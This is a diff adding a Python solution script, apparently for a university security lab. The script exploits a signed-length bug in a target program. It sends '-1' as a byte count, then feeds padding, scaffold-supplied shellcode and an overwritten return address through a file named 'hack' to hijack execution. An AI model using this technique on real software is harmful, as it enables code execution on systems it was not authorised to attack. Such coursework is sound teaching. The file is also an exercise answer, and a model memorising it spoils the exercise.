@@ -1,0 +1,35 @@
+#!/usr/bin/env python3
+
+import scaffold as p
+from scaffold import SHELLCODE
+import sys
+import re
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE STARTS HERE ###
+# print(f"shellcode: {repr(SHELLCODE)}")
+
+# The encoding='latin1' argument here is pretty important, so don't remove it!
+with open('hack', 'w', encoding='latin1') as f:
+    f.write('\x01'*8)
+
+p.start()
+
+assert p.recv(30) == 'How many bytes should I read? '
+
+with open('hack', 'a', encoding='latin1') as f:
+    f.write(SHELLCODE)
+    f.write('\x01'*4*17+'\xf0\xdb\xff\xff')
+
+p.send('-1\n')
+
+reply = p.recv(18)
+print(f'got reply: {repr(reply)}')
+
+# assert reply == 'Here is the file!\n'
+readout = p.recv(255)
+print(f'got readout: {repr(readout)}')
+
+### YOUR CODE ENDS HERE ###
